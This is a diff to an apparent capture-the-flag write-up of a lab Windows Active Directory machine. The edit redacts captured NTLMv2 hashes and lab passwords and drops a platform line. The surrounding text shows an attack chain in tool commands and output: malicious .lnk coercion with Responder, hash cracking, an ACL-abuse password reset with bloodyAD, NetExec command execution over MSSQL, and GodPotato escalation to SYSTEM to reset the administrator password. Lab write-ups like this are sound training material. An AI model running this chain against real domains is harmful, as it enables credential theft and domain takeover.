@@ -16,7 +16,6 @@ tags: ["windows", "ad", "responder", "ntlm", "slinky", "genericall", "acl-abuse"
 
 ## Overview
 
-**Platform:** HackSmarter
 **OS:** Windows Server 2022 Build 20348
 **Difficulty:** Medium
 **IP:** `10.1.124.132`
@@ -158,7 +157,7 @@ The slinky module creates a malicious `.lnk` file pointing to the attacker's IP.
 ```
 [SMB] NTLMv2-SSP Client   : 10.1.124.132
 [SMB] NTLMv2-SSP Username : HACK\bob.ross
-[SMB] NTLMv2-SSP Hash     : bob.ross::HACK:1122334455667788:0235AC6019A663BDB62675BB6FC975DD:010100000000000000C96481B26FDC011B92687D2EAB11110000000002000800330044005A00500001001E00570049004E002D005000550031004C00470050003600380036005100460004003400570049004E002D005000550031004C004700500036003800360051004600...
+[SMB] NTLMv2-SSP Hash     : [HASH REDACTED]
 ```
 
 ### Cracking the Hash
@@ -176,7 +175,7 @@ UwU Toolkit hashcrack > run
 [*] No hash type specified, attempting to identify...
 [+] Detected hash type: NetNTLMv2 (mode: 5600)
 
-[*] Sample hash: bob.ross::HACK:1122334455667788:94996B8DF5C3DD2233...
+[*] Sample hash: [HASH REDACTED]
 
 [?] Use hash type 5600 (NetNTLMv2)? [Y/n]: y
 [*] Transferring hashes to omarchy...
@@ -196,17 +195,17 @@ Dictionary cache built:
 * Keyspace..: 14344385
 * Runtime...: 0 secs
 
-BOB.ROSS::HACK:1122334455667788:94996b8df5c3dd223317e97787236e1c:...:137Password123!@#
+[HASH REDACTED]:[REDACTED]
 ```
 
-**Credentials obtained:** `bob.ross:137Password123!@#`
+**Credentials obtained:** `bob.ross:[REDACTED]`
 
 ### Configuring UwU Toolkit
 
 With valid credentials, UwU Toolkit's credential management system stores and automatically applies them to subsequent modules.
 
 ```
-UwU Toolkit > creds add bob.ross 137Password123!@#
+UwU Toolkit > creds add bob.ross [REDACTED]
 
 UwU Toolkit > creds show
 
@@ -215,7 +214,7 @@ Pwned Credentials
 
 User                      Domain               Password                  Hash
 ------------------------- -------------------- ------------------------- --------
-bob.ross                  -                    137Password123!@#         -
+bob.ross                  -                    [REDACTED]                -
 
 Total: 1 credential(s)
 ```
@@ -238,7 +237,7 @@ Setting bob.ross as the active credential for all modules:
 ```
 UwU Toolkit > creds use bob.ross
 [*] USER => bob.ross
-[*] PASS => 137Password123!@#
+[*] PASS => [REDACTED]
 [*] DOMAIN => hack.smarter
 [+] Loaded credential: bob.ross
 ```
@@ -309,9 +308,9 @@ Name               Current              Required  Description
 ------------------ ------------------- ---------- ----------------------------------
 DOMAIN             hack.smarter         yes       Domain name
 EXEGOL_CONTAINER                        no        Exegol container (auto-detect if empty)
-NET_PASS           Password123          no        User-defined option
-NEW_PASS           Password123          yes       New password for target
-PASS               137Password123!@#    yes       Password for USER
+NET_PASS           [REDACTED]           no        User-defined option
+NEW_PASS           [REDACTED]           yes       New password for target
+PASS               [REDACTED]           yes       Password for USER
 RHOSTS             10.0.19.55           yes       Domain Controller IP
 TARGET_USER        alice.wonderland     yes       Target user to reset password
 USER               bob.ross             yes       Username with ACL permissions
@@ -323,16 +322,16 @@ UwU Toolkit bloody_setpass > run
 [*] Domain: hack.smarter
 [*] Attacking User: bob.ross
 [*] Target User: alice.wonderland
-[*] New Password: Password123
+[*] New Password: [REDACTED]
 
 [*] Command: bloodyAD -u bob.ross -p [HIDDEN] -d hack.smarter --host 10.0.19.55 set password alice.wonderland [HIDDEN]
 
 [+] Password changed successfully!
-[+] New credentials: alice.wonderland:Password123
+[+] New credentials: alice.wonderland:[REDACTED]
 
 [*] Next steps:
 [*]   setg USER alice.wonderland
-[*]   setg PASS Password123
+[*]   setg PASS [REDACTED]
 
 [+] Module completed successfully
 ```
@@ -340,7 +339,7 @@ UwU Toolkit bloody_setpass > run
 Adding the new credentials to the credential store:
 
 ```
-UwU Toolkit bloody_setpass > creds add alice.wonderland Password123 -d hack.smarter
+UwU Toolkit bloody_setpass > creds add alice.wonderland [REDACTED] -d hack.smarter
 [+] Added credential: hack.smarter\alice.wonderland
 
 UwU Toolkit bloody_setpass > creds show
@@ -350,8 +349,8 @@ Pwned Credentials
 
 User                      Domain               Password                  Hash
 ------------------------- -------------------- ------------------------- --------
-bob.ross                  hack.smarter         137Password123!@#         -
-alice.wonderland          hack.smarter         Password123               -
+bob.ross                  hack.smarter         [REDACTED]                -
+alice.wonderland          hack.smarter         [REDACTED]                -
 
 Total: 2 credential(s)
 ```
@@ -370,10 +369,10 @@ UwU Toolkit netexec > run
 [*] Protocol: SMB
 [*] Action: check
 
-[*] Executing: NetExec smb 10.0.19.55 -u alice.wonderland -p Password123 -d hack.smarter
+[*] Executing: NetExec smb 10.0.19.55 -u alice.wonderland -p [REDACTED] -d hack.smarter
 
 [*] SMB  10.0.19.55  445  DC01  Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hack.smarter) (signing:True) (SMBv1:None) (Null Auth:True)
-[+] SMB  10.0.19.55  445  DC01  [+] hack.smarter\alice.wonderland:Password123
+[+] SMB  10.0.19.55  445  DC01  [+] hack.smarter\alice.wonderland:[REDACTED]
 
 [+] Module completed successfully
 ```
@@ -388,10 +387,10 @@ NXC_MODULE => whoami
 
 UwU Toolkit netexec > run
 
-[*] Executing: NetExec ldap 10.0.19.55 -u alice.wonderland -p Password123 -d hack.smarter -M whoami
+[*] Executing: NetExec ldap 10.0.19.55 -u alice.wonderland -p [REDACTED] -d hack.smarter -M whoami
 
 [*] LDAP  10.0.19.55  389  DC01  Windows Server 2022 Build 20348 (name:DC01) (domain:hack.smarter) (signing:None) (channel binding:No TLS cert)
-[+] LDAP  10.0.19.55  389  DC01  [+] hack.smarter\alice.wonderland:Password123
+[+] LDAP  10.0.19.55  389  DC01  [+] hack.smarter\alice.wonderland:[REDACTED]
     WHOAMI  10.0.19.55  389  DC01  Name: alice.wonderland
     WHOAMI  10.0.19.55  389  DC01  sAMAccountName: alice.wonderland
     WHOAMI  10.0.19.55  389  DC01  Enabled: Yes
@@ -416,7 +415,7 @@ UwU Toolkit > use evil_winrm
 
 UwU Toolkit evil_winrm > creds use 2
 [*] USER => alice.wonderland
-[*] PASS => Password123
+[*] PASS => [REDACTED]
 [*] DOMAIN => hack.smarter
 [+] Loaded credential: 2
 
@@ -641,10 +640,10 @@ UwU Toolkit netexec > run
 [*] Protocol: MSSQL
 [*] Action: execute
 
-[*] Executing: NetExec mssql 240.0.0.1 -u alice.wonderland -p Password123 -d hack.smarter -x whoami
+[*] Executing: NetExec mssql 240.0.0.1 -u alice.wonderland -p [REDACTED] -d hack.smarter -x whoami
 
 [*] MSSQL  240.0.0.1  1433  DC01  Windows Server 2022 Build 20348 (name:DC01) (domain:hack.smarter)
-[+] MSSQL  240.0.0.1  1433  DC01  [+] hack.smarter\alice.wonderland:Password123 (admin)
+[+] MSSQL  240.0.0.1  1433  DC01  [+] hack.smarter\alice.wonderland:[REDACTED] (admin)
 [+] MSSQL  240.0.0.1  1433  DC01  [+] Executed command via mssqlexec
     MSSQL  240.0.0.1  1433  DC01  nt service\mssql$sqlexpress
 ```
@@ -661,10 +660,10 @@ EXECUTE => 'whoami /priv'
 
 UwU Toolkit netexec > run
 
-[*] Executing: NetExec mssql 240.0.0.1 -u alice.wonderland -p Password123 -d hack.smarter -x 'whoami /priv'
+[*] Executing: NetExec mssql 240.0.0.1 -u alice.wonderland -p [REDACTED] -d hack.smarter -x 'whoami /priv'
 
 [*] MSSQL  240.0.0.1  1433  DC01  Windows Server 2022 Build 20348 (name:DC01) (domain:hack.smarter)
-[+] MSSQL  240.0.0.1  1433  DC01  [+] hack.smarter\alice.wonderland:Password123 (admin)
+[+] MSSQL  240.0.0.1  1433  DC01  [+] hack.smarter\alice.wonderland:[REDACTED] (admin)
 [+] MSSQL  240.0.0.1  1433  DC01  [+] Executed command via mssqlexec
     MSSQL  240.0.0.1  1433  DC01  PRIVILEGES INFORMATION
     MSSQL  240.0.0.1  1433  DC01  ----------------------
@@ -742,8 +741,8 @@ UwU Toolkit seimpersonate > run
 With SYSTEM execution capability, the domain administrator's password is changed:
 
 ```
-UwU Toolkit seimpersonate > set EXECUTE net user administrator Password123
-EXECUTE => net user administrator Password123
+UwU Toolkit seimpersonate > set EXECUTE net user administrator [REDACTED]
+EXECUTE => net user administrator [REDACTED]
 
 UwU Toolkit seimpersonate > run
 [*] Running seimpersonate...
@@ -757,7 +756,7 @@ UwU Toolkit seimpersonate > run
 [+] Download successful!
 
 [*] Step 2: Executing potato...
-[*] Command: C:\Windows\Temp\GodPotato.exe -cmd "net user administrator Password123"
+[*] Command: C:\Windows\Temp\GodPotato.exe -cmd "net user administrator [REDACTED]"
 
 [*] MSSQL  240.0.0.1  1433  DC01  [*] CurrentUser: NT AUTHORITY\SYSTEM
 [*] MSSQL  240.0.0.1  1433  DC01  [*] process start with pid 4948
@@ -801,9 +800,9 @@ UwU Toolkit > sessions
 
 | User | Domain | Password | Method |
 |------|--------|----------|--------|
-| `bob.ross` | hack.smarter | `137Password123!@#` | NTLMv2 hash cracked via Responder/Slinky |
-| `alice.wonderland` | hack.smarter | `Password123` | Password reset via GenericAll ACL abuse |
-| `administrator` | hack.smarter | `Password123` | Changed via GodPotato SYSTEM execution |
+| `bob.ross` | hack.smarter | `[REDACTED]` | NTLMv2 hash cracked via Responder/Slinky |
+| `alice.wonderland` | hack.smarter | `[REDACTED]` | Password reset via GenericAll ACL abuse |
+| `administrator` | hack.smarter | `[REDACTED]` | Changed via GodPotato SYSTEM execution |
 
 ---
 
@@ -839,7 +838,7 @@ UwU Toolkit > sessions
 ┌─────────────────────────────────────┐
 │  Hash Cracking                      │
 │  → hashcat -m 5600 (NetNTLMv2)      │
-│  → bob.ross:137Password123!@#       │
+│  → bob.ross:[REDACTED]              │
 └─────────────────────────────────────┘
      │
      ▼
@@ -854,7 +853,7 @@ UwU Toolkit > sessions
 │  ACL Abuse (BloodyAD)               │
 │  → Password reset without knowing   │
 │    current password                 │
-│  → alice.wonderland:Password123     │
+│  → alice.wonderland:[REDACTED]      │
 └─────────────────────────────────────┘
      │
      ▼
